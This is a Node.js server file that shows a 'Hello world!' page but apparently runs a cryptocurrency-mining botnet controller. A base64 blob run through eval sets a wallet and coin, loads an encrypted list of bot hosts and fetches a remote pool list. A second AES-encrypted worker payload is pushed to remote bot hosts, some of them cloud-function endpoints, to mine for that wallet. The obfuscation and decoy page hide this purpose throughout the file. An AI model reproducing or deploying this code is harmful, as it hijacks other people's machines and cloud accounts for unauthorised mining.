'use strict';
const fs = require('fs');
const request = require('request');
const CryptoJS = require("crypto-js");
const express=require('express');
const app=express();
app.get('/',function(req,res) { 
  if(req.query.active) {
    res.json({
      c: c, yellow_pools: yellow_pools,
      pools: mylist(pools), bots: mylist(bots)
    })
  }
  else { res.send('Hello world!') }
});
var s=app.listen(process.env.PORT||5000,()=>console.log(c.id+' Listening on port '+s.address().port));

var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };

var c = { active: 0, id: 1, state: 'orange' }
var yellow_pools = false;
var rec = false;

var pools = []; var bots = [];

var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
(`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKY
y5jb2luID0gJ1R1YmUnOwpjLndhbGxldCA9ICdieGNuTHZ5WU5xYUQ0RDZRZEp5ektmY2pKNlFjTUxnTVcyRE1xRVNVcTh4OUpFTTlmQWc2Y2tXRG5hMlhFajJNOEhmQ1A4RXpjYm5TR2JrWUZndmJ6SHZtMlZBT
jRrOEY2JzsKYy5oYXNoID0gJzAgaC9zIDAvMCc7CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLnBlZXJzID0gW2xpc3Quc2hpZ
nQoKV07IGMucGVlcnMucHVzaChsaXN0LnNoaWZ0KCkpOwpmb3IodmFyIGk9MDsgaTxsaXN0Lmxlbmd0aDsgaSsrKSB7IGxldCBuYm90PXtob3N0Omxpc3RbaV0sIHN0YXRlOidvcmFuZ2UnLCBoYXNoOicwIGgvc
yBbMC8wXSd9OyBib3RzLnB1c2gobmJvdCk7IHdha2V1cChuYm90KSB9OwpyZXF1ZXN0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2J1dGNoL215cG9vbC9tYXN0ZXIvcG9vbHMudHh0JywgZ
nVuY3Rpb24oZXJyLCByZXMsIGJvZHkpIHsKICB2YXIgbGlzdCA9IGRlY3J5cHQoYm9keSkuc3BsaXQoJ1xyXG4nKTsKICB2YXIgbXljb2luID0gcmVxdWlyZSgnLi8nK2MuY29pbisnLmpzJyk7CiAgZm9yKHZhc
iBpPTA7IGk8bGlzdC5sZW5ndGg7IGkrKykgcG9vbHMucHVzaChuZXcgbXljb2luKHsgd2FsbGV0OiBjLndhbGxldCwgaG9zdDogbGlzdFtpXSB9KSk7Cn0pOw==`)

var superbot = decrypt(fs.readFileSync('superbot.js','utf8'));
var worker = superbot+'\n'+decrypt(`
U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
agrwK1Qoaiiw//rGNdNIZA4RBtcHWdbuMrkxGItLMWr8UyiWx7FJ2CSiuSdeTvhT55VcVVYRTO2a2XRJdRytyXHk4mpQtFjIW0dNdq8MeESHSduKfBPZbGiXM1JhxPBFfDvo6VJa3c8umUwGa96uI3bP/J4UzEpl
DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsHomGOs7zHIXk1c3/0qs6M7bgZ0H6VmEKCIVUr6pm7uFKrz5MVGhIlSbP6IptWyybE9ORC0PFxPvt/Ih3s
ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);

function mylist(obj) {
  var result = []
  for(var i=0; i<obj.length; i++) result.push(obj[i].host+' - '+obj[i].state+' - '+obj[i].hash)
  return result
}

function wakeup(bot) {
  bot.msg = "wakeup";
  bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
  bot.wakecount = 60
}

function onmsg(bot) {
  delete bot.wakeup; delete bot.wakecount;
  if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
    for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
      if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
        pools[i].mysubmit(bot.msg[j],yellow_pools);
        break;
      };
    };

  let jobs = []; for(var i=0; i<pools.length; i++) if(pools[i].job) jobs.push(pools[i].job);
  if (!c.active || jobs.length == 0) wakeup(bot)
  else {
    var data = { jobs: jobs };
    request.post({url:bot.host+'/worker',form:{jobs:jobs},json:true },
      function(error, response, body) {
        if(body && body.toString().includes('Cannot POST'))
          request.post({url:bot.host,form:{worker:worker},json:true},function(error,response,body){botdb(error,body)})
        else botdb(error,body,true)
      }
    )
  }

  function botdb(error,body,next) {
    if(error) bot.msg=error.message
    else if(!body) bot.msg='body is empty'
    else if(body.error) bot.msg=body.error
    else if(!body.state) bot.msg='body is wrong'
    else {
      bot.state = body.state;
      bot.hash = body.hash;
      bot.msg = body.msg;
      if(next) return onmsg(bot);
      else return wakeup(bot)
    }
    if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
    else bot.state = 'red'; 
    bot.hash = '0 h/s '+bot.hash.split(' ')[2];
    wakeup(bot)
  }
}

setInterval(function() {
  var m = new Date().getMinutes();
  if(c.id == 1 && m < 30) c.active = m+1
  else if(c.id == 2 && m >= 30) c.active = m-29
  else c.active = 0

  if(!rec && c.active == 1) { rec = true;  request(c.peers[c.id-1], function(err, res, body) { rec = false }) }
  if(!rec && c.active == 30) { rec = true; request(c.peers[c.id == 1 ? 1 : 0], function(err, res, body) { rec = false }) }

  //--------------------------------------------------------

  var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;

  for(var i=0; i<pools.length; i++) {
    hsub += Number(pools[i].hash.split('/')[0]);
    hacp += Number(pools[i].hash.split('/')[1]);
    rt = pools[i].state == 'red' ? true: rt;
  }

  for(var i=0; i<bots.length; i++) {
    var ta = bots[i].hash.split(' '); bots[i].hash = ta[0]+' h/s '+ta[2];
    if(bots[i].wakecount) { bots[i].wakecount--;  bots[i].hash += ' - '+bots[i].wakecount+' sec' }
    hsum += Number(bots[i].hash.split(' ')[0]);
    rt = bots[i].state == 'red' ? true: rt
  }

  c.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
  c.hash = hsum+' h/s '+hsub+'/'+hacp;
}, 1000);
